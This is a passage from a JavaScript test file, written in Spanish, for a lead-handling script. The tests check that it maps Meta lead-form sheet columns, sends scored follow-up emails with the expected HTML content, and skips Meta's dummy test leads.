  assert.ok(a.htmlBody.includes('bgcolor="#f97316"') && a.htmlBody.includes('Empezar con Kunfupay') && a.htmlBody.includes('>04<') && a.htmlBody.includes('Fase de ordenar'));
  assert.ok(!a.htmlBody.includes('Eres candidato'));
  assert.ok(!b.htmlBody.includes('Aplicar a Classroom Platinum') && !b.htmlBody.includes('Empezar con Kunfupay') && !b.htmlBody.includes('>04<'));
  assert.ok(!b.htmlBody.includes('Eres candidato') && b.htmlBody.includes('Fuera del perfil de Platinum'));
});
prueba('hoja con las columnas exactas que deja Meta (id, created_time, …, ¿preguntas?, nombre_completo, correo_electrónico, phone_number): se lee y se envía', () => {
  const m = api_().mapearColumnas(ENC_META);
  assert.deepStrictEqual(['id', 'fecha', 'origen', 'audiencia', 'ritmo', 'modelo', 'facturacion', 'limitacion', 'nombre', 'email', 'telefono'].map((k) => ENC_META[m[k]]),
    ['id', 'created_time', 'platform', ENC_META[12], ENC_META[13], ENC_META[14], ENC_META[15], ENC_META[16], 'nombre_completo', 'correo_electrónico', 'phone_number']);
  const e = crearEntorno({ props: { WEBHOOK_TOKEN: TOKEN }, filas: [ENC_META, filaMeta()] });
  e.api.procesarPendientes();
  assert.strictEqual(e.estado.correos.length, 1); assert.strictEqual(e.estado.correos[0].to, 'ana@ejemplo.com');
  const f = fila(e, 2);
  assert.strictEqual(f.Estado, 'enviado'); assert.strictEqual(f.Puntaje, 74); assert.strictEqual(f.Medalla, 'Plata');
  assert.strictEqual(e.celdas[1][0], 'l:1203948576612345');   // la columna id de Meta no se toca
});
prueba('lead de prueba de Meta ("<test lead: dummy data for …>", test@meta.com) → omitido, sin correo', () => {
  const e = crearEntorno({ props: { WEBHOOK_TOKEN: TOKEN }, filas: [ENC_META, filaMeta().map((v, i) => (i >= 12 && i <= 17) ? dummy(ENC_META[i]) : i === 18 ? 'test@meta.com' : i === 19 ? 'p:' + dummy('phone_number') : v)] });
  e.api.procesarPendientes();
  assert.strictEqual(e.estado.correos.length, 0);
  assert.strictEqual(fila(e, 2).Estado, 'omitido'); assert.ok(fila(e, 2).Detalle.includes('Lead de prueba de Meta'));
  // un lead real con el correo test@meta.com tampoco sale
  const e2 = crearEntorno({ props: { WEBHOOK_TOKEN: TOKEN } });
  post(e2.api, leadMake({ email: 'test@meta.com' }));
  assert.strictEqual(e2.estado.correos.length, 0); assert.strictEqual(fila(e2, 2).Estado, 'omitido');
});
function api_() { return crearEntorno().api; }

console.log(`\n${n} pruebas superadas`);
